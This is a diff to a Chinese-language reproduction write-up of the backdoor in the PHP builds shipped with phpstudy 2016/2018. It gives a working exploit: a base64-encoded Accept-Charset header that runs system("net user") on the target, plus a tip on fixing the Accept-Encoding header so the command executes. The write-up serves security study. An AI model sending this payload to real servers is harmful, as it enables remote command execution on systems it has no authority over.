@@ -19,8 +19,7 @@ phpstudy 2016和phpstudy 2018自带的php-5.2.17、php-5.4.45
 # 0x05 漏洞复现
 攻击环境：kali_x64_en-us
 
-burp抓包，请求头中添加如下数据：  
-Accept-Charset:ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7  
+burp抓包，请求头中添加字段：Accept-Charset:ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7  
 上述字符串是“echo system("net user");”base64编码后的字符串，结果如下图  
 ![image](./1.png)  
 需要注意，发送的数据包头部中：Accept-Enconding:gzio, deflate有一处问题，deflate与前面的逗号之间有一个空格，需要手动删除，不然无法成功执行命令
